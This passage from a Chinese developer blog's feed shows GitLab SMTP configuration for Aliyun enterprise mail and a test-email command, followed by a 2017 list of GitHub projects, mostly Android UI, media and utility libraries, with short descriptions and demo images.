<h4 id="阿里云企业邮箱"><a href="#阿里云企业邮箱" class="headerlink" title="阿里云企业邮箱"></a>阿里云企业邮箱</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab_rails['smtp_enable'] = true</span><br><span class="line">gitlab_rails['smtp_address'] = "smtp.qiye.aliyun.com"</span><br><span class="line">gitlab_rails['smtp_port'] = 465</span><br><span class="line">gitlab_rails['smtp_user_name'] = "username@your domain"</span><br><span class="line">gitlab_rails['smtp_password'] = "password"</span><br><span class="line">gitlab_rails['smtp_domain'] = "your domain"</span><br><span class="line">gitlab_rails['smtp_authentication'] = "login"</span><br><span class="line">gitlab_rails['smtp_enable_starttls_auto'] = false</span><br><span class="line">gitlab_rails['smtp_tls'] = true</span><br></pre></td></tr></table></figure>
<h4 id="默认使用ssl，如果不用就要加入以下配置"><a href="#默认使用ssl，如果不用就要加入以下配置" class="headerlink" title="默认使用ssl，如果不用就要加入以下配置"></a>默认使用ssl，如果不用就要加入以下配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab_rails['smtp_enable_starttls_auto'] = false</span><br><span class="line">gitlab_rails['smtp_tls'] = false</span><br><span class="line">gitlab_rails['smtp_openssl_verify_mode'] = 'none'</span><br><span class="line">gitlab_rails['smtp_ssl'] = false </span><br><span class="line">gitlab_rails['smtp_force_ssl'] = false</span><br></pre></td></tr></table></figure>
<h4 id="测试邮件功能"><a href="#测试邮件功能" class="headerlink" title="测试邮件功能"></a>测试邮件功能</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gitlab-rails console</span><br><span class="line">Notify.test_email(&apos;test@qq.com&apos;, &apos;Message Subject&apos;, &apos;Message Body&apos;).deliver_now</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>GitHub资源备忘2017</title>
    <url>/github/GitHub%E8%B5%84%E6%BA%90%E5%A4%87%E5%BF%982017/</url>
    <content><![CDATA[<p><a href="https://github.com/trending/java" target="_blank" rel="noopener">https://github.com/trending/java</a></p>
<h2 id="anproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具-Java"><a href="#anproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具-Java" class="headerlink" title="anproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具 (Java)"></a>anproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具 (Java)</h2><p><a href="https://gitee.com/fengfei/lanproxy" target="_blank" rel="noopener">Gitee</a></p>
<h2 id="P2P传输-流媒体-P2P-SDK库，功能强大的内网穿透（UDP打洞）库，支持rtmp、hls、sip等多种协议-C-库"><a href="#P2P传输-流媒体-P2P-SDK库，功能强大的内网穿透（UDP打洞）库，支持rtmp、hls、sip等多种协议-C-库" class="headerlink" title="P2P传输(流媒体+P2P)SDK库，功能强大的内网穿透（UDP打洞）库，支持rtmp、hls、sip等多种协议(C++库)"></a>P2P传输(流媒体+P2P)SDK库，功能强大的内网穿透（UDP打洞）库，支持rtmp、hls、sip等多种协议(C++库)</h2><p><a href="https://github.com/dengzy401/ppeasy" target="_blank" rel="noopener">Github</a></p>
<h2 id="Libjingle-是一个方便实现P2P传输的开源库-由Google公司用C-开发"><a href="#Libjingle-是一个方便实现P2P传输的开源库-由Google公司用C-开发" class="headerlink" title="Libjingle 是一个方便实现P2P传输的开源库(由Google公司用C++开发)"></a>Libjingle 是一个方便实现P2P传输的开源库(由Google公司用C++开发)</h2><p><a href="https://github.com/vigsterkr/libjingle" target="_blank" rel="noopener">Github</a></p>
<h2 id="Android-FTP服务器实现"><a href="#Android-FTP服务器实现" class="headerlink" title="Android FTP服务器实现"></a>Android FTP服务器实现</h2><p><a href="https://github.com/ppareit/swiftp" target="_blank" rel="noopener">Github</a></p>
<h2 id="算法可视化学习"><a href="#算法可视化学习" class="headerlink" title="算法可视化学习"></a>算法可视化学习</h2><p><a href="https://github.com/naman14/AlgorithmVisualizer-Android" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/naman14/AlgorithmVisualizer-Android/master/screenshots/screen1.png" width="300" height="400" align="center"></p>
<h2 id="用Java实现所有算法"><a href="#用Java实现所有算法" class="headerlink" title="用Java实现所有算法"></a>用Java实现所有算法</h2><p><a href="https://github.com/TheAlgorithms/Java" target="_blank" rel="noopener">Github</a><br><img src="https://upload.wikimedia.org/wikipedia/commons/f/f7/Binary_search_into_array.png" alt></p>
<h2 id="Android示例"><a href="#Android示例" class="headerlink" title="Android示例"></a>Android示例</h2><p><a href="https://github.com/nisrulz/android-examples" target="_blank" rel="noopener">Github</a></p>
<h2 id="App打印Android的日志"><a href="#App打印Android的日志" class="headerlink" title="App打印Android的日志"></a>App打印Android的日志</h2><p><a href="https://github.com/Zane96/Fairy" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/Zane96/Fairy/raw/master/screenshot/Screenshot_2.png" width="300" height="400" align="center"></p>
<h2 id="卡片视图"><a href="#卡片视图" class="headerlink" title="卡片视图"></a>卡片视图</h2><p><a href="https://github.com/vipulasri/TicketView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/vipulasri/TicketView/raw/master/art/showcase.png" width="300" height="400" align="center"></p>
<h2 id="封装Canvas库"><a href="#封装Canvas库" class="headerlink" title="封装Canvas库"></a>封装Canvas库</h2><p><a href="https://github.com/florent37/MyLittleCanvas" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/florent37/MyLittleCanvas/master/medias/text_anim.gif" width="300" height="400" align="center"></p>
<hr>
<h2 id="一个易用且高效的商用级UI库"><a href="#一个易用且高效的商用级UI库" class="headerlink" title="一个易用且高效的商用级UI库"></a>一个易用且高效的商用级UI库</h2><p><a href="https://github.com/chenBingX/SuperTextView" target="_blank" rel="noopener">Github</a><br><img src="https://user-gold-cdn.xitu.io/2018/1/10/160e01fd4806ff39?imageView2/0/w/1280/h/960/ignore-error/1" width="300" height="400" align="center"></p>
<h2 id="Label-辅助类"><a href="#Label-辅助类" class="headerlink" title="Label 辅助类"></a>Label 辅助类</h2><p><a href="https://github.com/yanbober/AvatarLabelView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/yanbober/AvatarLabelView/raw/master/.picture/demo.png" width="300" height="400" align="center"></p>
<h2 id="一个给RecyclerView增加弹性动画的库（iOS的tableview效果）"><a href="#一个给RecyclerView增加弹性动画的库（iOS的tableview效果）" class="headerlink" title="一个给RecyclerView增加弹性动画的库（iOS的tableview效果）"></a>一个给RecyclerView增加弹性动画的库（iOS的tableview效果）</h2><p><a href="https://github.com/EverythingMe/overscroll-decor" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/EverythingMe/overscroll-decor/raw/master/recyclerview_demo.gif" alt></p>
<h2 id="收藏-点赞等动画"><a href="#收藏-点赞等动画" class="headerlink" title="收藏/点赞等动画"></a>收藏/点赞等动画</h2><p><a href="https://github.com/ChadCSong/ShineButton" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/ChadCSong/ShineButton/raw/master/demo_shine_others.gif" alt></p>
<h2 id="收藏的动画"><a href="#收藏的动画" class="headerlink" title="收藏的动画"></a>收藏的动画</h2><p><a href="https://github.com/frogermcs/LikeAnimation" target="_blank" rel="noopener">Github</a><br><img src="https://camo.githubusercontent.com/752e0e35b15b6b684cee90b6bf4309f387caa36f/687474703a2f2f66726f6765726d63732e6769746875622e696f2f696d616765732f32322f627574746f6e5f616e696d2e676966" alt></p>
<h2 id="FloatingButton动画展示弹框"><a href="#FloatingButton动画展示弹框" class="headerlink" title="FloatingButton动画展示弹框"></a>FloatingButton动画展示弹框</h2><p><a href="https://github.com/Krupen/FabulousFilter" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/Krupen/FabulousFilter/master/newDemo1.gif" width="300" height="400" align="center"></p>
<h2 id="TabLayout底部导航"><a href="#TabLayout底部导航" class="headerlink" title="TabLayout底部导航"></a>TabLayout底部导航</h2><p><a href="https://github.com/long1eu/SpaceTabLayout" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/long1eu/SpaceTabLayout/raw/master/readmeSource/5.gif" alt></p>
<h2 id="贝尔曲线loading动画"><a href="#贝尔曲线loading动画" class="headerlink" title="贝尔曲线loading动画"></a>贝尔曲线loading动画</h2><p><a href="https://github.com/lusfold/SpinnerLoading" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/lusfold/SpinnerLoading/raw/master/preview.gif" width="300" height="300" align="center"></p>
<p><a href="https://github.com/JeasonWong/BezierLoadingView" target="_blank" rel="noopener">Github</a><br><img src="http://www.jcodecraeer.com/uploads/160620/1-160620013420261.gif" width="300" height="300" align="center"></p>
<h2 id="32种样式的动画展开或隐藏菜单"><a href="#32种样式的动画展开或隐藏菜单" class="headerlink" title="32种样式的动画展开或隐藏菜单"></a>32种样式的动画展开或隐藏菜单</h2><p><a href="https://github.com/Nightonke/BoomMenu/blob/master/README-ZH.md" target="_blank" rel="noopener">Github</a>,支持Android和iOS.</p>
<p><img src="https://github.com/Nightonke/BoomMenu/raw/master/Pictures/place_type_3.png" alt><br><img src="https://github.com/Nightonke/BoomMenu/raw/master/Pictures/place_type_4.png" alt></p>
<table><br><td><br><img src="https://github.com/Nightonke/BoomMenu/raw/master/Pictures/text-inside-button.gif" width="300" height="300" align="left"><br></td><br><td><br><img src="https://github.com/Nightonke/BoomMenu/raw/master/Pictures/show_list.gif" width="300" height="300" align="left"><br></td><br></table>

<h2 id="视频播放进度调节"><a href="#视频播放进度调节" class="headerlink" title="视频播放进度调节"></a>视频播放进度调节</h2><p><a href="https://github.com/rubensousa/PreviewSeekBar" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/rubensousa/PreviewSeekBar/raw/master/screenshots/playmovies.gif" width="400" height="300" align="center"><br><img src="https://github.com/rubensousa/PreviewSeekBar/raw/master/screenshots/sample.gif" width="400" height="300" align="center"></p>
<h2 id="浏览器指纹库（Html标识唯一设备）"><a href="#浏览器指纹库（Html标识唯一设备）" class="headerlink" title="浏览器指纹库（Html标识唯一设备）"></a>浏览器指纹库（Html标识唯一设备）</h2><p><a href="https://github.com/Valve/fingerprintJS" target="_blank" rel="noopener">Github</a><br>浏览器的唯一特征，就像人的指纹一样。可以匿名识别Web浏览器，准确率高达94%。通过查询浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器。</p>
<h2 id="js全栈工程师培训材料"><a href="#js全栈工程师培训材料" class="headerlink" title="js全栈工程师培训材料"></a>js全栈工程师培训材料</h2><p><a href="https://github.com/ruanyf/jstraining" target="_blank" rel="noopener">Github</a></p>
<h2 id="分析某些开源库实现的原理"><a href="#分析某些开源库实现的原理" class="headerlink" title="分析某些开源库实现的原理"></a>分析某些开源库实现的原理</h2><p><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="noopener">Github</a></p>
<h2 id="字体效果"><a href="#字体效果" class="headerlink" title="字体效果"></a>字体效果</h2><p><a href="https://github.com/hanks-zyh/HTextView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/hanks-zyh/HTextView/raw/master/screenshot/demo3.gif" alt><br><img src="https://github.com/hanks-zyh/HTextView/raw/master/screenshot/demo7.gif" alt></p>
<h2 id="android-逆向工程工具集"><a href="#android-逆向工程工具集" class="headerlink" title="android 逆向工程工具集"></a>android 逆向工程工具集</h2><p><a href="https://github.com/Juude/droidReverse" target="_blank" rel="noopener">Github</a></p>
<h2 id="根据当前Android系统播放音乐回调的FFT数据绘画visualizer"><a href="#根据当前Android系统播放音乐回调的FFT数据绘画visualizer" class="headerlink" title="根据当前Android系统播放音乐回调的FFT数据绘画visualizer"></a>根据当前Android系统播放音乐回调的FFT数据绘画visualizer</h2><p><a href="https://github.com/bogerchan/Nier-Visualizer" target="_blank" rel="noopener">Nier-Visualizer</a></p>
<table><br><td><img src="https://github.com/bogerchan/Nier-Visualizer/raw/master/doc/img/renderer1.gif" width="300" height="300" align="center"></td><br><td><img src="https://github.com/bogerchan/Nier-Visualizer/raw/master/doc/img/renderer5.gif" width="300" height="300" align="center"></td><br></table>

<table><br><td><img src="https://github.com/bogerchan/Nier-Visualizer/raw/master/doc/img/renderer6.gif" width="300" height="300" align="center"></td><br><td><img src="https://github.com/bogerchan/Nier-Visualizer/raw/master/doc/img/renderer7.gif" width="300" height="300" align="center"></td><br><td><img src="https://github.com/bogerchan/Nier-Visualizer/raw/master/doc/img/renderer8.gif" width="300" height="300" align="center"></td><br></table>


<p><a href="https://github.com/GautamChibde/android-audio-visualizer" target="_blank" rel="noopener">android-audio-visualizer</a></p>
<p> <img src="https://camo.githubusercontent.com/1289f756363e1e96a53a6be2a124c6afc2d4e7d1/687474703a2f2f7
265732e636c6f7564696e6172792e636f6d2f64766b7866677072632f696d6167652f75706c6f61642f635f7363616c
652c775f3434302f76313531313433313633302f67697068795f31305f7979653066652e676966" alt><br> <img src="https://camo.githubusercontent.com/5acc1715ce91be6f8a2acc22d79b6de88949ecef/687474703a2f2f7
265732e636c6f7564696e6172792e636f6d2f64766b7866677072632f696d6167652f75706c6f61642f635f7363616c
652c775f3434302f76313531313432383437312f67697068795f365f7573646965742e676966" alt><br> <img src="https://camo.githubusercontent.com/dd62d9726015a0db7a07ff96705dc1eb23fd927f/687474703a2f2f7
265732e636c6f7564696e6172792e636f6d2f64766b7866677072632f696d6167652f75706c6f61642f635f7363616c
652c775f3434302f76313531313433303430362f67697068795f385f7777336a647a2e676966" alt><br><img src="https://camo.githubusercontent.com/71567996c9ae958cb0f95d4bf7fdd605f8b3591e/687474703a2f2f7
265732e636c6f7564696e6172792e636f6d2f64766b7866677072632f696d6167652f75706c6f61642f635f7363616c
652c775f3434302f76313531313432373633322f67697068795f355f7669787765722e676966" alt></p>
<h2 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h2><p><a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">Github</a><br><img src="https://i.imgur.com/h917IBZ.png" width="300" height="300" align="center"></p>
<h2 id="HanLP自然语言处理-中文分词"><a href="#HanLP自然语言处理-中文分词" class="headerlink" title="HanLP自然语言处理 中文分词"></a>HanLP自然语言处理 中文分词</h2><p>自然语言处理 中文分词 词性标注 命名实体识别 依存句法分析 关键词提取 新词发现 短语提取 自动摘要 文本分类 拼音简繁<br><a href="https://github.com/hankcs/HanLP" target="_blank" rel="noopener">Github</a></p>
<h2 id="Jcseg轻量级中文分词器"><a href="#Jcseg轻量级中文分词器" class="headerlink" title="Jcseg轻量级中文分词器"></a>Jcseg轻量级中文分词器</h2><p><a href="https://github.com/lionsoul2014/jcseg" target="_blank" rel="noopener">Github</a><br>集成了关键字提取，关键短语提取，关键句子提取和文章自动摘要等功能，并且提供了一个基于Jetty的web服务器，方便各大语言直接http调用</p>
<h2 id="Android录屏"><a href="#Android录屏" class="headerlink" title="Android录屏"></a>Android录屏</h2><p><a href="https://github.com/yrom/ScreenRecorder" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/yrom/ScreenRecorder/raw/master/screenshot.png" width="300" height="300" align="center"></p>
<h2 id="Google的Android截屏示例代码"><a href="#Google的Android截屏示例代码" class="headerlink" title="Google的Android截屏示例代码"></a>Google的Android截屏示例代码</h2><p><a href="https://github.com/googlesamples/android-ScreenCapture" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/googlesamples/android-ScreenCapture/raw/master/screenshots/main.png" width="300" height="300" align="center"></p>
<h2 id="RTMP直播推流客户端"><a href="#RTMP直播推流客户端" class="headerlink" title="RTMP直播推流客户端"></a>RTMP直播推流客户端</h2><p><a href="https://github.com/begeekmyfriend/yasea" target="_blank" rel="noopener">Github</a><br>该项目借鉴了以下项目：<br><a href="https://github.com/ossrs/srs-sea" target="_blank" rel="noopener">srs-sea</a><br><a href="https://github.com/faucamp/SimpleRtmp" target="_blank" rel="noopener">SimpleRtmp</a><br><a href="https://github.com/wuhaoyu1990/MagicCamera" target="_blank" rel="noopener">MagicCamera</a><br><a href="http://www.videolan.org/developers/x264.html" target="_blank" rel="noopener">x264</a><br><a href="https://github.com/sannies/mp4parser" target="_blank" rel="noopener">mp4parser</a></p>
<h2 id="挡位调节器"><a href="#挡位调节器" class="headerlink" title="挡位调节器"></a>挡位调节器</h2><p><a href="https://github.com/mochixuan/RegulatorView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/mochixuan/RegulatorView/raw/master/RegulatorMaster/img/main.jpg" width="200" height="300" align="center"></p>
<h2 id="通过SVG来做动画"><a href="#通过SVG来做动画" class="headerlink" title="通过SVG来做动画"></a>通过SVG来做动画</h2><p><a href="https://github.com/jaredrummler/AnimatedSvgView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/jaredrummler/AnimatedSvgView/raw/master/demo/demo.gif" width="200" height="300" align="center"></p>
<h2 id="粒子动画"><a href="#粒子动画" class="headerlink" title="粒子动画"></a>粒子动画</h2><p><a href="https://github.com/plattysoft/Leonids" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/plattysoft/Leonids/master/images/Leonids_one_shot.gif" width="200" height="300" align="center"></p>
<h2 id="一个用粒子动画显示文字的-Android-自定义-View"><a href="#一个用粒子动画显示文字的-Android-自定义-View" class="headerlink" title="一个用粒子动画显示文字的 Android 自定义 View"></a>一个用粒子动画显示文字的 Android 自定义 View</h2><p><a href="https://github.com/Yasic/ParticleTextView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/Yasic/ParticleTextView/raw/master/Screenshot/Total.gif?raw=true" width="300" height="300" align="center"></p>
<h2 id="支持-SingleLine-模式的标签云效果"><a href="#支持-SingleLine-模式的标签云效果" class="headerlink" title="支持 SingleLine 模式的标签云效果"></a>支持 SingleLine 模式的标签云效果</h2><p><a href="https://github.com/kingideayou/TagCloudView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/kingideayou/TagCloudView/master/imgs/tagCloudView_1.png" width="300" height="300" align="center"></p>
<p>这种效果可以用<a href="https://github.com/google/flexbox-layout" target="_blank" rel="noopener">google的FlexboxLayout</a>实现<br><a href="https://www.jianshu.com/p/05954091c650" target="_blank" rel="noopener">示例1</a><br><a href="https://www.jianshu.com/p/217b3f4a1a18" target="_blank" rel="noopener">示例2</a><br><img src="/images/github/google的FlexboxLayout.png" alt></p>
<h2 id="ToggleButtonGroup"><a href="#ToggleButtonGroup" class="headerlink" title="ToggleButtonGroup"></a>ToggleButtonGroup</h2><p><a href="https://github.com/nex3z/ToggleButtonGroup" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/nex3z/ToggleButtonGroup/raw/master/images/tags.gif" width="300" height="300" align="center"></p>
<h2 id="ToggleDrawable"><a href="#ToggleDrawable" class="headerlink" title="ToggleDrawable"></a>ToggleDrawable</h2><p><a href="https://github.com/renaudcerrato/ToggleDrawable" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/renaudcerrato/ToggleDrawable/raw/master/artworks/toggle.gif" width="300" height="300" align="center"></p>
<hr>
<p><a href="http://www.cnblogs.com/jincheng-yangchaofan/articles/7018780.html" target="_blank" rel="noopener">一款来自</a></p>
<h2 id="一款自制表情包键盘"><a href="#一款自制表情包键盘" class="headerlink" title="一款自制表情包键盘"></a>一款自制表情包键盘</h2><p><a href="https://github.com/w446108264/XhsEmoticonsKeyboard" target="_blank" rel="noopener">Github</a></p>
<table><tr><br><td><br><img src="https://github.com/w446108264/XhsEmoticonsKeyboard/raw/master/output/simple-comment.png" width="300" height="300" align="center"><br></td><br><td><br><img src="https://github.com/w446108264/XhsEmoticonsKeyboard/raw/master/output/chat-qqfav.png" width="300" height="300" align="center"><br></td><br></tr></table>



<h2 id="一款提供后台任务管理能力的框架"><a href="#一款提供后台任务管理能力的框架" class="headerlink" title="一款提供后台任务管理能力的框架"></a>一款提供后台任务管理能力的框架</h2><p><a href="https://github.com/yigit/android-priority-jobqueue" target="_blank" rel="noopener">Github</a></p>
<h2 id="一款提供设置沉浸式状态栏样式能力的框架"><a href="#一款提供设置沉浸式状态栏样式能力的框架" class="headerlink" title="一款提供设置沉浸式状态栏样式能力的框架"></a>一款提供设置沉浸式状态栏样式能力的框架</h2><p><a href="https://github.com/laobie/StatusBarUtil" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/laobie/StatusBarUtil/raw/master/img/use_in_fragment.gif" width="300" height="300" align="center"></p>
<h2 id="一款高效、稳定、灵活、易用的文件下载引擎"><a href="#一款高效、稳定、灵活、易用的文件下载引擎" class="headerlink" title="一款高效、稳定、灵活、易用的文件下载引擎"></a>一款高效、稳定、灵活、易用的文件下载引擎</h2><p><a href="https://github.com/lingochamp/FileDownloader" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://github.com/lingochamp/FileDownloader/raw/master/art/single_demo.gif" width="300" height="300" align="center"><br><img src="https://github.com/lingochamp/FileDownloader/raw/master/art/chunked_demo.gif" width="300" height="300" align="center"></p>
<h2 id="一款基于注解的提供解决运行时危险权限方案的框架"><a href="#一款基于注解的提供解决运行时危险权限方案的框架" class="headerlink" title="一款基于注解的提供解决运行时危险权限方案的框架"></a>一款基于注解的提供解决运行时危险权限方案的框架</h2><p><a href="https://github.com/hotchemi/PermissionsDispatcher" target="_blank" rel="noopener">Github</a></p>
<h2 id="一款提供可爱动画集合的框架"><a href="#一款提供可爱动画集合的框架" class="headerlink" title="一款提供可爱动画集合的框架"></a>一款提供可爱动画集合的框架</h2><p><a href="https://github.com/daimajia/AndroidViewAnimations" target="_blank" rel="noopener">Github</a><br><img src="http://ww3.sinaimg.cn/mw690/610dc034gw1ej75mi2w77g20c30jb4qr.gif" width="300" height="300" align="center"></p>
<h2 id="一款提供场景转换过渡能力的动画框架"><a href="#一款提供场景转换过渡能力的动画框架" class="headerlink" title="一款提供场景转换过渡能力的动画框架"></a>一款提供场景转换过渡能力的动画框架</h2><p><a href="https://github.com/lgvalle/Material-Animations" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/lgvalle/Material-Animations/master/screenshots/transition_slide.gif" width="300" height="300" align="center"></p>
<hr>
<h2 id="Camera-Android-API高级易用性封装库"><a href="#Camera-Android-API高级易用性封装库" class="headerlink" title="Camera Android API高级易用性封装库"></a>Camera Android API高级易用性封装库</h2><p><a href="https://github.com/wonderkiln/CameraKit-Android" target="_blank" rel="noopener">Github</a></p>
<h2 id="Google-风格的-Page-Indicator-效果"><a href="#Google-风格的-Page-Indicator-效果" class="headerlink" title="Google 风格的 Page Indicator 效果"></a>Google 风格的 Page Indicator 效果</h2><p><a href="https://github.com/romandanylyk/PageIndicatorView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/romandanylyk/PageIndicatorView/master/assets/anim_slide.g
if" alt><br><img src="https://raw.githubusercontent.com/romandanylyk/PageIndicatorView/master/assets/anim_thin_wo
rm.gif" alt><br><img src="https://raw.githubusercontent.com/romandanylyk/PageIndicatorView/master/assets/anim_drop.gi
f" alt></p>
<h2 id="分析github用户的概况"><a href="#分析github用户的概况" class="headerlink" title="分析github用户的概况"></a>分析github用户的概况</h2><p><a href="https://github.com/tipsy/github-profile-summary" target="_blank" rel="noopener">Github</a><br><img src="https://user-images.githubusercontent.com/1521451/34072014-4451dbf6-e280-11e7-90a7-32ad1f313541.PNG" width="300" height="300" align="center"></p>
<h2 id="Netty-实战-精简翻译"><a href="#Netty-实战-精简翻译" class="headerlink" title="Netty 实战-精简翻译"></a>Netty 实战-精简翻译</h2><p><a href="https://github.com/waylau/essential-netty-in-action" target="_blank" rel="noopener">Github</a></p>
<h2 id="基于IJKPlayer，实现了多功能的视频播放器"><a href="#基于IJKPlayer，实现了多功能的视频播放器" class="headerlink" title="基于IJKPlayer，实现了多功能的视频播放器"></a>基于IJKPlayer，实现了多功能的视频播放器</h2><p><a href="https://github.com/CarGuo/GSYVideoPlayer" target="_blank" rel="noopener">Github</a></p>
<h2 id="LAME"><a href="#LAME" class="headerlink" title="LAME"></a>LAME</h2><p><a href="https://sourceforge.net/projects/lame/files/lame/" target="_blank" rel="noopener">源码</a> LAME 是最好的MP3编码库，可以将PCM文件编码为MP3文件。</p>
<p>以下库对LAME封装，可以直接使用。<br><a href="https://github.com/naman14/TAndroidLame" target="_blank" rel="noopener">TAndroidLame</a><br><a href="https://github.com/nwaldispuehl/java-lame" target="_blank" rel="noopener">java-lame</a><br><a href="https://github.com/rpplusplus/iOSMp3Recorder" target="_blank" rel="noopener">iOSMp3Recorder</a></p>
<h2 id="mp3agic"><a href="#mp3agic" class="headerlink" title="mp3agic"></a>mp3agic</h2><p><a href="https://github.com/mpatric/mp3agic" target="_blank" rel="noopener">Github</a> 一个java库，读取mp3的各种信息</p>
<h2 id="圆形菜单"><a href="#圆形菜单" class="headerlink" title="圆形菜单"></a>圆形菜单</h2><p><a href="https://github.com/Ramotion/circle-menu-android" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/Ramotion/circle-menu-android/raw/master/preview.gif" width="300" height="300" align="center"></p>
<h2 id="一个强大易用的安卓工具类库"><a href="#一个强大易用的安卓工具类库" class="headerlink" title="一个强大易用的安卓工具类库"></a>一个强大易用的安卓工具类库</h2><p>它合理地封装了安卓开发中常用的函数，具有完善的Demo和单元测试，利用其封装好的 APIs<br>可以大大提高开发效率。<br><a href="https://github.com/Blankj/AndroidUtilCode" target="_blank" rel="noopener">Github</a></p>
<h2 id="知乎-漂亮的图片选择器"><a href="#知乎-漂亮的图片选择器" class="headerlink" title="知乎-漂亮的图片选择器"></a>知乎-漂亮的图片选择器</h2><p><a href="https://github.com/zhihu/Matisse" target="_blank" rel="noopener">Github</a><br><img src="/images/github/漂亮的图片选择器.png" alt="screenshot_dracula.png"></p>
<h2 id="BottomSheetLayout"><a href="#BottomSheetLayout" class="headerlink" title="BottomSheetLayout"></a>BottomSheetLayout</h2><p><a href="https://github.com/qhutch/BottomSheetLayout" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://raw.githubusercontent.com/qhutch/BottomSheetLayout/master/sample_gif.gif" alt></p>
<h2 id="Android-Bootstrap"><a href="#Android-Bootstrap" class="headerlink" title="Android-Bootstrap"></a>Android-Bootstrap</h2><p><a href="https://github.com/Bearded-Hen/Android-Bootstrap" target="_blank" rel="noopener">Github</a><br><img src="https://raw.github.com/Bearded-Hen/Android-Bootstrap/master/images/bootstrap_button.png" width="300" alt="BootstrapButton"></p>
<h2 id="FragmentStack"><a href="#FragmentStack" class="headerlink" title="FragmentStack"></a>FragmentStack</h2><p><a href="https://github.com/Mr-wangyong/FragmentStack" target="_blank" rel="noopener">Github</a></p>
<h2 id="蓝牙BLE库-Bluetooth-LE-Library—Android"><a href="#蓝牙BLE库-Bluetooth-LE-Library—Android" class="headerlink" title="蓝牙BLE库 Bluetooth-LE-Library—Android"></a>蓝牙BLE库 Bluetooth-LE-Library—Android</h2><p><a href="https://github.com/alt236/Bluetooth-LE-Library---Android" target="_blank" rel="noopener">Github</a></p>
<h2 id="CircularFillableLoaders"><a href="#CircularFillableLoaders" class="headerlink" title="CircularFillableLoaders"></a>CircularFillableLoaders</h2><p><a href="https://github.com/lopspower/CircularFillableLoaders" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/lopspower/CircularFillableLoaders/raw/master/preview/preview.gif" width="300" height="300" align="center"></p>
<h2 id="SectorProgressView"><a href="#SectorProgressView" class="headerlink" title="SectorProgressView"></a>SectorProgressView</h2><p><a href="https://github.com/timqi/SectorProgressView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/timqi/SectorProgressView/master/art/colorfulringprogressview.demo.gif" alt="ColorfulRingProgressView"> <img src="https://raw.githubusercontent.com/timqi/SectorProgressView/master/art/sectorprogressview.demo.gif" alt="SectorProgressView"></p>
<h2 id="UltimateRecyclerView"><a href="#UltimateRecyclerView" class="headerlink" title="UltimateRecyclerView"></a>UltimateRecyclerView</h2><p><a href="https://github.com/cymcsg/UltimateRecyclerView" target="_blank" rel="noopener">Github</a><br><img src="https://bytebucket.org/marshalchen/images/raw/44beb162121c719ea4094bd7ea1c9f0cd7de4c04/ultimaterecyclerview/ultimate_recyclerview12.gif" width="200" height="300" align="center"><br><img src="https://bytebucket.org/marshalchen/images/raw/44beb162121c719ea4094bd7ea1c9f0cd7de4c04/ultimaterecyclerview/ultimate_recyclerview7.gif" width="200" height="300" align="center"><br><img src="http://i.giphy.com/pLWHKsEdVlsKA.gif" width="200" height="300" align="center"></p>
<h2 id="ArcSeekBar"><a href="#ArcSeekBar" class="headerlink" title="ArcSeekBar"></a>ArcSeekBar</h2><p><a href="https://github.com/MarcinMoskala/ArcSeekBar" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/MarcinMoskala/ArcSeekBar/master/art/flow.gif" width="200" height="200" align="center"></p>
<h2 id="DropDownView"><a href="#DropDownView" class="headerlink" title="DropDownView"></a>DropDownView</h2><p><a href="https://github.com/AnthonyFermin/DropDownView" target="_blank" rel="noopener">Github</a><br><img src="https://media.giphy.com/media/26FmQTErmydlNAvks/giphy.gif" alt></p>
<h2 id="FFT"><a href="#FFT" class="headerlink" title="FFT"></a>FFT</h2><p><a href="https://github.com/paramsen/noise" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/paramsen/noise/master/sample_preview.gif" alt></p>
<h2 id="GifLoadingView"><a href="#GifLoadingView" class="headerlink" title="GifLoadingView"></a>GifLoadingView</h2><p><a href="https://github.com/Rogero0o/GifLoadingView" target="_blank" rel="noopener">Github</a></p>
